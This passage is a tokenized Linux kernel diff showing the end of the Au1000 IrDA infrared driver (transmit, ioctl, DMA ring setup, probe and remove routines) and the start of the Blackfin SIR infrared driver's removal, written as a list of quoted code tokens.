"-", ">", "irq", ")", ";", "return", "retval", ";", "}", "/", "*", "Give", "self", "a", "hardware", "name", "*", "/", "sprintf", "(", "hwname", ",", "\"", "Au1000", "SIR", "/", "FIR", "\"", ");", "aup", "-", ">", "irlap", "=", "irlap_open", "(", "dev", ",", "&", "aup", "-", ">", "qos", ",", "hwname", ")", ";", "netif_start_queue", "(", "dev", ")", ";", "/", "*", "int", "enable", "*", "/", "irda_write", "(", "aup", ",", "IR_CONFIG_2", ",", "irda_read", "(", "aup", ",", "IR_CONFIG_2", ")", "|", "IR_IEN", ")", ";", "/", "*", "power", "up", "*", "/", "au1k_irda_plat_set_phy_mode", "(", "aup", ",", "AU1000_IRDA_PHY_MODE_SIR", ")", ";", "return", "0", ";", "}", "static", "int", "au1k_irda_stop", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "au1k_irda_plat_set_phy_mode", "(", "aup", ",", "AU1000_IRDA_PHY_MODE_OFF", ")", ";", "/", "*", "disable", "interrupts", "*", "/", "irda_write", "(", "aup", ",", "IR_CONFIG_2", ",", "irda_read", "(", "aup", ",", "IR_CONFIG_2", ")", "&", "~", "IR_IEN", ")", ";", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "0", ")", ";", "irda_write", "(", "aup", ",", "IR_ENABLE", ",", "0", ")", ";", "/", "*", "disable", "clock", "*", "/", "if", "(", "aup", "-", ">", "irlap", ")", "{", "irlap_close", "(", "aup", "-", ">", "irlap", ")", ";", "aup", "-", ">", "irlap", "=", "NULL", ";", "}", "netif_stop_queue", "(", "dev", ")", ";", "/", "*", "disable", "the", "interrupt", "*", "/", "free_irq", "(", "aup", "-", ">", "irq_tx", ",", "dev", ")", ";", "free_irq", "(", "aup", "-", ">", "irq_rx", ",", "dev", ")", ";", "clk_disable_unprepare", "(", "aup", "-", ">", "irda_clk", ")", ";", "clk_put", "(", "aup", "-", ">", "irda_clk", ")", ";", "return", "0", ";", "}", "/", "*", "*", "Au1000", "transmit", "routine", ".", "*", "/", "static", "int", "au1k_irda_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "dev", ")", "{", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "int", "speed", "=", "irda_get_next_speed", "(", "skb", ")", ";", "volatile", "struct", "ring_dest", "*", "ptxd", ";", "struct", "db_dest", "*", "pDB", ";", "u32", "len", ",", "flags", ";", "if", "(", "speed", "!", "=", "aup", "-", ">", "speed", "&", "&", "speed", "!", "=", "-", "1", ")", "aup", "-", ">", "newspeed", "=", "speed", ";", "if", "(", "(", "skb", "-", ">", "len", "=", "=", "0", ")", "&", "&", "(", "aup", "-", ">", "newspeed", ")", ")", "{", "if", "(", "aup", "-", ">", "tx_tail", "=", "=", "aup", "-", ">", "tx_head", ")", "{", "au1k_irda_set_speed", "(", "dev", ",", "speed", ")", ";", "aup", "-", ">", "newspeed", "=", "0", ";", "}", "dev_kfree_skb", "(", "skb", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "ptxd", "=", "aup", "-", ">", "tx_ring", "[", "aup", "-", ">", "tx_head", "]", ";", "flags", "=", "ptxd", "-", ">", "flags", ";", "if", "(", "flags", "&", "AU_OWN", ")", "{", "netdev_debug", "(", "dev", ",", "\"", "tx_full", "\\", "n", "\"", ");", "netif_stop_queue", "(", "dev", ")", ";", "aup", "-", ">", "tx_full", "=", "1", ";", "return", "1", ";", "}", "else", "if", "(", "((", "aup", "-", ">", "tx_head", "+", "1", ")", "&", "(", "NUM_IR_DESC", "-", "1", ")", ")", "=", "=", "aup", "-", ">", "tx_tail", ")", "{", "netdev_debug", "(", "dev", ",", "\"", "tx_full", "\\", "n", "\"", ");", "netif_stop_queue", "(", "dev", ")", ";", "aup", "-", ">", "tx_full", "=", "1", ";", "return", "1", ";", "}", "pDB", "=", "aup", "-", ">", "tx_db_inuse", "[", "aup", "-", ">", "tx_head", "]", ";", "#", "if", "0", "if", "(", "irda_read", "(", "aup", ",", "IR_RX_BYTE_CNT", ")", "!", "=", "0", ")", "{", "netdev_debug", "(", "dev", ",", "\"", "tx", "warning", ":", "rx", "byte", "cnt", "%", "x", "\\", "n", "\"", ",", "irda_read", "(", "aup", ",", "IR_RX_BYTE_CNT", ")", ");", "}", "#", "endif", "if", "(", "aup", "-", ">", "speed", "=", "=", "4000000", ")", "{", "/", "*", "FIR", "*", "/", "skb_copy_from_linear_data", "(", "skb", ",", "(", "void", "*", ")", "pDB", "-", ">", "vaddr", ",", "skb", "-", ">", "len", ")", ";", "ptxd", "-", ">", "count_0", "=", "skb", "-", ">", "len", "&", "0xff", ";", "ptxd", "-", ">", "count_1", "=", "(", "skb", "-", ">", "len", ">", ">", "8", ")", "&", "0xff", ";", "}", "else", "{", "/", "*", "SIR", "*", "/", "len", "=", "async_wrap_skb", "(", "skb", ",", "(", "u8", "*", ")", "pDB", "-", ">", "vaddr", ",", "MAX_BUF_SIZE", ")", ";", "ptxd", "-", ">", "count_0", "=", "len", "&", "0xff", ";", "ptxd", "-", ">", "count_1", "=", "(", "len", ">", ">", "8", ")", "&", "0xff", ";", "ptxd", "-", ">", "flags", "|", "=", "IR_DIS_CRC", ";", "}", "ptxd", "-", ">", "flags", "|", "=", "AU_OWN", ";", "wmb", "(", ");", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "irda_read", "(", "aup", ",", "IR_CONFIG_1", ")", "|", "IR_TX_ENABLE", ")", ";", "irda_write", "(", "aup", ",", "IR_RING_PROMPT", ",", "0", ")", ";", "dev_kfree_skb", "(", "skb", ")", ";", "aup", "-", ">", "tx_head", "=", "(", "aup", "-", ">", "tx_head", "+", "1", ")", "&", "(", "NUM_IR_DESC", "-", "1", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*", "*", "The", "Tx", "ring", "has", "been", "full", "longer", "than", "the", "watchdog", "timeout", "*", "value", ".", "The", "transmitter", "must", "be", "hung", "?", "*", "/", "static", "void", "au1k_tx_timeout", "(", "struct", "net_device", "*", "dev", ")", "{", "u32", "speed", ";", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "netdev_err", "(", "dev", ",", "\"", "tx", "timeout", "\\", "n", "\"", ");", "speed", "=", "aup", "-", ">", "speed", ";", "aup", "-", ">", "speed", "=", "0", ";", "au1k_irda_set_speed", "(", "dev", ",", "speed", ")", ";", "aup", "-", ">", "tx_full", "=", "0", ";", "netif_wake_queue", "(", "dev", ")", ";", "}", "static", "int", "au1k_irda_ioctl", "(", "struct", "net_device", "*", "dev", ",", "struct", "ifreq", "*", "ifreq", ",", "int", "cmd", ")", "{", "struct", "if_irda_req", "*", "rq", "=", "(", "struct", "if_irda_req", "*", ")", "ifreq", ";", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "int", "ret", "=", "-", "EOPNOTSUPP", ";", "switch", "(", "cmd", ")", "{", "case", "SIOCSBANDWIDTH", ":", "if", "(", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "/", "*", "*", "We", "are", "unable", "to", "set", "the", "speed", "if", "the", "*", "device", "is", "not", "running", ".", "*", "/", "if", "(", "aup", "-", ">", "open", ")", "ret", "=", "au1k_irda_set_speed", "(", "dev", ",", "rq", "-", ">", "ifr_baudrate", ")", ";", "else", "{", "netdev_err", "(", "dev", ",", "\"", "ioctl", ":", "!", "netif_running", "\\", "n", "\"", ");", "ret", "=", "0", ";", "}", "}", "break", ";", "case", "SIOCSMEDIABUSY", ":", "ret", "=", "-", "EPERM", ";", "if", "(", "capable", "(", "CAP_NET_ADMIN", ")", ")", "{", "irda_device_set_media_busy", "(", "dev", ",", "TRUE", ")", ";", "ret", "=", "0", ";", "}", "break", ";", "case", "SIOCGRECEIVING", ":", "rq", "-", ">", "ifr_receiving", "=", "0", ";", "break", ";", "default", ":", "break", ";", "}", "return", "ret", ";", "}", "static", "const", "struct", "net_device_ops", "au1k_irda_netdev_ops", "=", "{", ".", "ndo_open", "=", "au1k_irda_start", ",", ".", "ndo_stop", "=", "au1k_irda_stop", ",", ".", "ndo_start_xmit", "=", "au1k_irda_hard_xmit", ",", ".", "ndo_tx_timeout", "=", "au1k_tx_timeout", ",", ".", "ndo_do_ioctl", "=", "au1k_irda_ioctl", ",", "}", ";", "static", "int", "au1k_irda_net_init", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "db_dest", "*", "pDB", ",", "*", "pDBfree", ";", "int", "i", ",", "err", ",", "retval", "=", "0", ";", "dma_addr_t", "temp", ";", "err", "=", "au1k_irda_init_iobuf", "(", "&", "aup", "-", ">", "rx_buff", ",", "14384", ")", ";", "if", "(", "err", ")", "goto", "out1", ";", "dev", "-", ">", "netdev_ops", "=", "&", "au1k_irda_netdev_ops", ";", "irda_init_max_qos_capabilies", "(", "&", "aup", "-", ">", "qos", ")", ";", "/", "*", "The", "only", "value", "we", "must", "override", "it", "the", "baudrate", "*", "/", "aup", "-", ">", "qos", ".", "baud_rate", ".", "bits", "=", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", "|", "IR_115200", "|", "IR_576000", "|", "(", "IR_4000000", "<", "<", "8", ")", ";", "aup", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "=", "qos_mtt_bits", ";", "irda_qos_bits_to_value", "(", "&", "aup", "-", ">", "qos", ")", ";", "retval", "=", "-", "ENOMEM", ";", "/", "*", "Tx", "ring", "follows", "rx", "ring", "+", "512", "bytes", "*", "/", "/", "*", "we", "need", "a", "1k", "aligned", "buffer", "*", "/", "aup", "-", ">", "rx_ring", "[", "0", "]", "=", "(", "struct", "ring_dest", "*", ")", "dma_alloc", "(", "2", "*", "MAX_NUM_IR_DESC", "*", "(", "sizeof", "(", "struct", "ring_dest", ")", "),", "&", "temp", ")", ";", "if", "(", "!", "aup", "-", ">", "rx_ring", "[", "0", "]", ")", "goto", "out2", ";", "/", "*", "allocate", "the", "data", "buffers", "*", "/", "aup", "-", ">", "db", "[", "0", "]", ".", "vaddr", "=", "dma_alloc", "(", "MAX_BUF_SIZE", "*", "2", "*", "NUM_IR_DESC", ",", "&", "temp", ")", ";", "if", "(", "!", "aup", "-", ">", "db", "[", "0", "]", ".", "vaddr", ")", "goto", "out3", ";", "setup_hw_rings", "(", "aup", ",", "(", "u32", ")", "aup", "-", ">", "rx_ring", "[", "0", "]", ",", "(", "u32", ")", "aup", "-", ">", "rx_ring", "[", "0", "]", "+", "512", ")", ";", "pDBfree", "=", "NULL", ";", "pDB", "=", "aup", "-", ">", "db", ";", "for", "(", "i", "=", "0", ";", "i", "<", "(", "2", "*", "NUM_IR_DESC", ")", ";", "i", "+", "+)", "{", "pDB", "-", ">", "pnext", "=", "pDBfree", ";", "pDBfree", "=", "pDB", ";", "pDB", "-", ">", "vaddr", "=", "(", "u32", "*", ")(", "(", "unsigned", ")", "aup", "-", ">", "db", "[", "0", "]", ".", "vaddr", "+", "(", "MAX_BUF_SIZE", "*", "i", ")", ");", "pDB", "-", ">", "dma_addr", "=", "(", "dma_addr_t", ")", "virt_to_bus", "(", "pDB", "-", ">", "vaddr", ")", ";", "pDB", "+", "+;", "}", "aup", "-", ">", "pDBfree", "=", "pDBfree", ";", "/", "*", "attach", "a", "data", "buffer", "to", "each", "descriptor", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "NUM_IR_DESC", ";", "i", "+", "+)", "{", "pDB", "=", "GetFreeDB", "(", "aup", ")", ";", "if", "(", "!", "pDB", ")", "goto", "out3", ";", "aup", "-", ">", "rx_ring", "[", "i", "]", "->", "addr_0", "=", "(", "u8", ")", "(", "pDB", "-", ">", "dma_addr", "&", "0xff", ")", ";", "aup", "-", ">", "rx_ring", "[", "i", "]", "->", "addr_1", "=", "(", "u8", ")", "((", "pDB", "-", ">", "dma_addr", ">", ">", "8", ")", "&", "0xff", ")", ";", "aup", "-", ">", "rx_ring", "[", "i", "]", "->", "addr_2", "=", "(", "u8", ")", "((", "pDB", "-", ">", "dma_addr", ">", ">", "16", ")", "&", "0xff", ")", ";", "aup", "-", ">", "rx_ring", "[", "i", "]", "->", "addr_3", "=", "(", "u8", ")", "((", "pDB", "-", ">", "dma_addr", ">", ">", "24", ")", "&", "0xff", ")", ";", "aup", "-", ">", "rx_db_inuse", "[", "i", "]", "=", "pDB", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "NUM_IR_DESC", ";", "i", "+", "+)", "{", "pDB", "=", "GetFreeDB", "(", "aup", ")", ";", "if", "(", "!", "pDB", ")", "goto", "out3", ";", "aup", "-", ">", "tx_ring", "[", "i", "]", "->", "addr_0", "=", "(", "u8", ")", "(", "pDB", "-", ">", "dma_addr", "&", "0xff", ")", ";", "aup", "-", ">", "tx_ring", "[", "i", "]", "->", "addr_1", "=", "(", "u8", ")", "((", "pDB", "-", ">", "dma_addr", ">", ">", "8", ")", "&", "0xff", ")", ";", "aup", "-", ">", "tx_ring", "[", "i", "]", "->", "addr_2", "=", "(", "u8", ")", "((", "pDB", "-", ">", "dma_addr", ">", ">", "16", ")", "&", "0xff", ")", ";", "aup", "-", ">", "tx_ring", "[", "i", "]", "->", "addr_3", "=", "(", "u8", ")", "((", "pDB", "-", ">", "dma_addr", ">", ">", "24", ")", "&", "0xff", ")", ";", "aup", "-", ">", "tx_ring", "[", "i", "]", "->", "count_0", "=", "0", ";", "aup", "-", ">", "tx_ring", "[", "i", "]", "->", "count_1", "=", "0", ";", "aup", "-", ">", "tx_ring", "[", "i", "]", "->", "flags", "=", "0", ";", "aup", "-", ">", "tx_db_inuse", "[", "i", "]", "=", "pDB", ";", "}", "return", "0", ";", "out3", ":", "dma_free", "(", "(", "void", "*", ")", "aup", "-", ">", "rx_ring", "[", "0", "]", ",", "2", "*", "MAX_NUM_IR_DESC", "*", "(", "sizeof", "(", "struct", "ring_dest", ")", "))", ";", "out2", ":", "kfree", "(", "aup", "-", ">", "rx_buff", ".", "head", ")", ";", "out1", ":", "netdev_err", "(", "dev", ",", "\"", "au1k_irda_net_init", "(", ")", "failed", ".", "Returns", "%", "d", "\\", "n", "\"", ");", "return", "retval", ";", "}", "static", "int", "au1k_irda_probe", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "au1k_private", "*", "aup", ";", "struct", "net_device", "*", "dev", ";", "struct", "resource", "*", "r", ";", "struct", "clk", "*", "c", ";", "int", "err", ";", "dev", "=", "alloc_irdadev", "(", "sizeof", "(", "struct", "au1k_private", ")", ");", "if", "(", "!", "dev", ")", "return", "-", "ENOMEM", ";", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "aup", "-", ">", "platdata", "=", "pdev", "-", ">", "dev", ".", "platform_data", ";", "err", "=", "-", "EINVAL", ";", "r", "=", "platform_get_resource", "(", "pdev", ",", "IORESOURCE_IRQ", ",", "0", ")", ";", "if", "(", "!", "r", ")", "goto", "out", ";", "aup", "-", ">", "irq_tx", "=", "r", "-", ">", "start", ";", "r", "=", "platform_get_resource", "(", "pdev", ",", "IORESOURCE_IRQ", ",", "1", ")", ";", "if", "(", "!", "r", ")", "goto", "out", ";", "aup", "-", ">", "irq_rx", "=", "r", "-", ">", "start", ";", "r", "=", "platform_get_resource", "(", "pdev", ",", "IORESOURCE_MEM", ",", "0", ")", ";", "if", "(", "!", "r", ")", "goto", "out", ";", "err", "=", "-", "EBUSY", ";", "aup", "-", ">", "ioarea", "=", "request_mem_region", "(", "r", "-", ">", "start", ",", "resource_size", "(", "r", ")", ",", "pdev", "-", ">", "name", ")", ";", "if", "(", "!", "aup", "-", ">", "ioarea", ")", "goto", "out", ";", "/", "*", "bail", "out", "early", "if", "clock", "doesn", "'", "t", "exist", "*", "/", "c", "=", "clk_get", "(", "NULL", ",", "\"", "irda_clk", "\"", ");", "if", "(", "IS_ERR", "(", "c", ")", ")", "{", "err", "=", "PTR_ERR", "(", "c", ")", ";", "goto", "out", ";", "}", "clk_put", "(", "c", ")", ";", "aup", "-", ">", "iobase", "=", "ioremap_nocache", "(", "r", "-", ">", "start", ",", "resource_size", "(", "r", ")", ");", "if", "(", "!", "aup", "-", ">", "iobase", ")", "goto", "out2", ";", "dev", "-", ">", "irq", "=", "aup", "-", ">", "irq_rx", ";", "err", "=", "au1k_irda_net_init", "(", "dev", ")", ";", "if", "(", "err", ")", "goto", "out3", ";", "err", "=", "register_netdev", "(", "dev", ")", ";", "if", "(", "err", ")", "goto", "out4", ";", "platform_set_drvdata", "(", "pdev", ",", "dev", ")", ";", "netdev_info", "(", "dev", ",", "\"", "IrDA", ":", "Registered", "device", "\\", "n", "\"", ");", "return", "0", ";", "out4", ":", "dma_free", "(", "(", "void", "*", ")", "aup", "-", ">", "db", "[", "0", "]", ".", "vaddr", ",", "MAX_BUF_SIZE", "*", "2", "*", "NUM_IR_DESC", ")", ";", "dma_free", "(", "(", "void", "*", ")", "aup", "-", ">", "rx_ring", "[", "0", "]", ",", "2", "*", "MAX_NUM_IR_DESC", "*", "(", "sizeof", "(", "struct", "ring_dest", ")", "))", ";", "kfree", "(", "aup", "-", ">", "rx_buff", ".", "head", ")", ";", "out3", ":", "iounmap", "(", "aup", "-", ">", "iobase", ")", ";", "out2", ":", "release_resource", "(", "aup", "-", ">", "ioarea", ")", ";", "kfree", "(", "aup", "-", ">", "ioarea", ")", ";", "out", ":", "free_netdev", "(", "dev", ")", ";", "return", "err", ";", "}", "static", "int", "au1k_irda_remove", "(", "struct", "platform_device", "*", "pdev", ")", "{", "struct", "net_device", "*", "dev", "=", "platform_get_drvdata", "(", "pdev", ")", ";", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "unregister_netdev", "(", "dev", ")", ";", "dma_free", "(", "(", "void", "*", ")", "aup", "-", ">", "db", "[", "0", "]", ".", "vaddr", ",", "MAX_BUF_SIZE", "*", "2", "*", "NUM_IR_DESC", ")", ";", "dma_free", "(", "(", "void", "*", ")", "aup", "-", ">", "rx_ring", "[", "0", "]", ",", "2", "*", "MAX_NUM_IR_DESC", "*", "(", "sizeof", "(", "struct", "ring_dest", ")", "))", ";", "kfree", "(", "aup", "-", ">", "rx_buff", ".", "head", ")", ";", "iounmap", "(", "aup", "-", ">", "iobase", ")", ";", "release_resource", "(", "aup", "-", ">", "ioarea", ")", ";", "kfree", "(", "aup", "-", ">", "ioarea", ")", ";", "free_netdev", "(", "dev", ")", ";", "return", "0", ";", "}", "static", "struct", "platform_driver", "au1k_irda_driver", "=", "{", ".", "driver", "=", "{", ".", "name", "=", "\"", "au1000", "-", "irda", "\"", ",", "}", ",", ".", "probe", "=", "au1k_irda_probe", ",", ".", "remove", "=", "au1k_irda_remove", ",", "}", ";", "module_platform_driver", "(", "au1k_irda_driver", ")", ";", "MODULE_AUTHOR", "(", "\"", "Pete", "Popov", "<", "ppopov", "@", "mvista", ".", "com", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "Au1000", "IrDA", "Device", "Driver", "\"", ");", "@", "@", "-", "1", ",", "819", "+", "0", ",", "0", "@", "@", "/", "*", "*", "Blackfin", "Infra", "-", "red", "Driver", "*", "*", "Copyright", "2006", "-", "2009", "Analog", "Devices", "Inc", ".", "*", "*", "Enter", "bugs", "at", "http", ":", "//", "blackfin", ".", "uclinux", ".", "org", "/", "*", "*", "Licensed", "under", "the", "GPL", "-", "2", "or", "later", ".", "*", "*", "/", "#", "include", "\"", "bfin_sir", ".", "h", "\"", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "#", "define", "DMA_SIR_RX_XCNT", "10", "#", "define", "DMA_SIR_RX_YCNT", "(", "PAGE_SIZE", "/", "DMA_SIR_RX_XCNT", ")", "#", "define", "DMA_SIR_RX_FLUSH_JIFS", "(", "HZ", "*", "4", "/", "250", ")", "#", "endif", "#", "if", "ANOMALY_05000447", "static", "int", "max_rate", "=", "57600", ";", "#", "else", "static", "int", "max_rate", "=", "115200", ";", "#", "endif", "static", "void", "bfin_sir_rx_dma_timeout", "(", "struct", "timer_list", "*", "t", ")", ";", "static", "void", "turnaround_delay", "(", "int", "mtt", ")", "{", "long", "ticks", ";", "mtt", "=", "mtt", "<", "10000", "?", "10000", ":", "mtt", ";", "ticks", "=", "1", "+", "mtt", "/", "(", "USEC_PER_SEC", "/", "HZ", ")", ";", "schedule_timeout_uninterruptible", "(", "ticks", ")", ";", "}", "static", "void", "bfin_sir_init_ports", "(", "struct", "bfin_sir_port", "*", "sp", ",", "struct", "platform_device", "*", "pdev", ")", "{", "int", "i", ";", "struct", "resource", "*", "res", ";", "for", "(", "i", "=", "0", ";", "i", "<", "pdev", "-", ">", "num_resources", ";", "i", "+", "+)", "{", "res", "=", "&", "pdev", "-", ">", "resource", "[", "i", "]", ";", "switch", "(", "res", "-", ">", "flags", ")", "{", "case", "IORESOURCE_MEM", ":", "sp", "-", ">", "membase", "=", "(", "void", "__iomem", "*", ")", "res", "-", ">", "start", ";", "break", ";", "case", "IORESOURCE_IRQ", ":", "sp", "-", ">", "irq", "=", "res", "-", ">", "start", ";", "break", ";", "case", "IORESOURCE_DMA", ":", "sp", "-", ">", "rx_dma_channel", "=", "res", "-", ">", "start", ";", "sp", "-", ">", "tx_dma_channel", "=", "res", "-", ">", "end", ";", "break", ";", "default", ":", "break", ";", "}", "}", "sp", "-", ">", "clk", "=", "get_sclk", "(", ");", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "sp", "-", ">", "tx_done", "=", "1", ";", "timer_setup", "(", "&", "sp", "-", ">", "rx_dma_timer", ",", "bfin_sir_rx_dma_timeout", ",", "0", ")", ";", "#", "endif", "}", "static", "void", "bfin_sir_stop_tx", "(", "struct", "bfin_sir_port", "*", "port", ")", "{", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "disable_dma", "(", "port", "-", ">", "tx_dma_channel", ")", ";", "#", "endif", "while", "(", "!(", "UART_GET_LSR", "(", "port", ")", "&", "THRE", ")", ")", "{", "cpu_relax", "(", ");", "continue", ";", "}", "UART_CLEAR_IER", "(", "port", ",", "ETBEI", ")", ";", "}", "static", "void", "bfin_sir_enable_tx", "(", "struct", "bfin_sir_port", "*", "port", ")", "{", "UART_SET_IER", "(", "port", ",", "ETBEI", ")", ";", "}", "static", "void", "bfin_sir_stop_rx", "(", "struct", "bfin_sir_port", "*", "port", ")", "{", "UART_CLEAR_IER", "(", "port", ",", "ERBFI", ")", ";", "}", "static", "void", "bfin_sir_enable_rx", "(", "struct", "bfin_sir_port", "*", "port", ")", "{", "UART_SET_IER", "(", "port", ",", "ERBFI", ")", ";", "}", "static", "int", "bfin_sir_set_speed", "(", "struct", "bfin_sir_port", "*", "port", ",", "int", "speed", ")", "{", "int", "ret", "=", "-", "EINVAL", ";", "unsigned", "int", "quot", ";", "unsigned", "short", "val", ",", "lsr", ",", "lcr", ";", "static", "int", "utime", ";", "int", "count", "=", "10", ";", "lcr", "=", "WLS", "(", "8", ")", ";", "switch", "(", "speed", ")", "{", "case", "9600", ":", "case", "19200", ":", "case", "38400", ":", "case", "57600", ":", "case", "115200", ":", "/", "*", "*", "IRDA", "is", "not", "affected", "by", "anomaly", "05000230", ",", "so", "there", "is", "no", "*", "need", "to", "tweak", "the", "divisor", "like", "he", "UART", "driver", "(", "which", "will", "*", "slightly", "speed", "up", "the", "baud", "rate", "on", "us", ")", ".", "*", "/", "quot", "=", "(", "port", "-", ">", "clk", "+", "(", "8", "*", "speed", ")", ")", "/", "(", "16", "*", "speed", ")", ";", "do", "{", "udelay", "(", "utime", ")", ";", "lsr", "=", "UART_GET_LSR", "(", "port", ")", ";", "}", "while", "(", "!(", "lsr", "&", "TEMT", ")", "&", "&", "count", "-", "-)", ";", "/", "*", "The", "useconds", "for", "1", "bits", "to", "transmit", "*", "/", "utime", "=", "1000000", "/", "speed", "+", "1", ";", "/", "*", "Clear", "UCEN", "bit", "to", "reset", "the", "UART", "state", "machine", "*", "and", "control", "registers", "*", "/", "val", "=", "UART_GET_GCTL", "(", "port", ")", ";", "val", "&", "=", "~", "UCEN", ";", "UART_PUT_GCTL", "(", "port", ",", "val", ")", ";", "/", "*", "Set", "DLAB", "in", "LCR", "to", "Access", "THR", "RBR", "IER", "*", "/", "UART_SET_DLAB", "(", "port", ")", ";", "SSYNC", "(", ");", "UART_PUT_DLL", "(", "port", ",", "quot", "&", "0xFF", ")", ";", "UART_PUT_DLH", "(", "port", ",", "(", "quot", ">", ">", "8", ")", "&", "0xFF", ")", ";", "SSYNC", "(", ");", "/", "*", "Clear", "DLAB", "in", "LCR", "*", "/", "UART_CLEAR_DLAB", "(", "port", ")", ";", "SSYNC", "(", ");", "UART_PUT_LCR", "(", "port", ",", "lcr", ")", ";", "val", "=", "UART_GET_GCTL", "(", "port", ")", ";", "val", "|", "=", "UCEN", ";", "UART_PUT_GCTL", "(", "port", ",", "val", ")", ";", "ret", "=", "0", ";", "break", ";", "default", ":", "printk", "(", "KERN_WARNING", "\"", "bfin_sir", ":", "Invalid", "speed", "%", "d", "\\", "n", "\"", ",", "speed", ")", ";", "break", ";", "}", "val", "=", "UART_GET_GCTL", "(", "port", ")", ";", "/", "*", "If", "not", "add", "the", "'", "RPOLC", "'", ",", "we", "can", "'", "t", "catch", "the", "receive", "interrupt", ".", "*", "It", "'", "s", "related", "with", "the", "HW", "layout", "and", "the", "IR", "transiver", ".", "*", "/", "val", "|", "=", "UMOD_IRDA", "|", "RPOLC", ";", "UART_PUT_GCTL", "(", "port", ",", "val", ")", ";", "return", "ret", ";", "}", "static", "int", "bfin_sir_is_receiving", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "if", "(", "!(", "UART_GET_IER", "(", "port", ")", "&", "ERBFI", ")", ")", "return", "0", ";", "return", "self", "-", ">", "rx_buff", ".", "state", "!", "=", "OUTSIDE_FRAME", ";", "}", "#", "ifdef", "CONFIG_SIR_BFIN_PIO", "static", "void", "bfin_sir_tx_chars", "(", "struct", "net_device", "*", "dev", ")", "{", "unsigned", "int", "chr", ";", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "if", "(", "self", "-", ">", "tx_buff", ".", "len", "!", "=", "0", ")", "{", "chr", "=", "*", "(", "self", "-", ">", "tx_buff", ".", "data", ")", ";", "UART_PUT_CHAR", "(", "port", ",", "chr", ")", ";", "self", "-", ">", "tx_buff", ".", "data", "+", "+;", "self", "-", ">", "tx_buff", ".", "len", "-", "-;", "}", "else", "{", "self", "-", ">", "stats", ".", "tx_packets", "+", "+;", "self", "-", ">", "stats", ".", "tx_bytes", "+", "=", "self", "-", ">", "tx_buff", ".", "data", "-", "self", "-", ">", "tx_buff", ".", "head", ";", "if", "(", "self", "-", ">", "newspeed", ")", "{", "bfin_sir_set_speed", "(", "port", ",", "self", "-", ">", "newspeed", ")", ";", "self", "-", ">", "speed", "=", "self", "-", ">", "newspeed", ";", "self", "-", ">", "newspeed", "=", "0", ";", "}", "bfin_sir_stop_tx", "(", "port", ")", ";", "bfin_sir_enable_rx", "(", "port", ")", ";", "/", "*", "I", "'", "m", "hungry", "!", "*", "/", "netif_wake_queue", "(", "dev", ")", ";", "}", "}", "static", "void", "bfin_sir_rx_chars", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "unsigned", "char", "ch", ";", "UART_CLEAR_LSR", "(", "port", ")", ";", "ch", "=", "UART_GET_CHAR", "(", "port", ")", ";", "async_unwrap_char", "(", "dev", ",", "&", "self", "-", ">", "stats", ",", "&", "self", "-", ">", "rx_buff", ",", "ch", ")", ";", "}", "static", "irqreturn_t", "bfin_sir_rx_int", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "spin_lock", "(", "&", "self", "-", ">", "lock", ")", ";", "while", "(", "(", "UART_GET_LSR", "(", "port", ")", "&", "DR", ")", ")", "bfin_sir_rx_chars", "(", "dev", ")", ";", "spin_unlock", "(", "&", "self", "-", ">", "lock", ")", ";", "return", "IRQ_HANDLED", ";", "}", "static", "irqreturn_t", "bfin_sir_tx_int", "(", "int", "irq", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "spin_lock", "(", "&", "self", "-", ">", "lock", ")", ";", "if", "(", "UART_GET_LSR", "(", "port", ")", "&", "THRE", ")", "bfin_sir_tx_chars", "(", "dev", ")", ";", "spin_unlock", "(", "&", "self", "-", ">", "lock", ")", ";", "return", "IRQ_HANDLED", ";", "}", "#", "endif", "/", "*", "CONFIG_SIR_BFIN_PIO", "*", "/", "#", "ifdef", "CONFIG_SIR_BFIN_DMA", "static", "void", "bfin_sir_dma_tx_chars", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "bfin_sir_self", "*", "self", "=", "netdev_priv", "(", "dev", ")", ";", "struct", "bfin_sir_port", "*", "port", "=", "self", "-", ">", "sir_port", ";", "if", 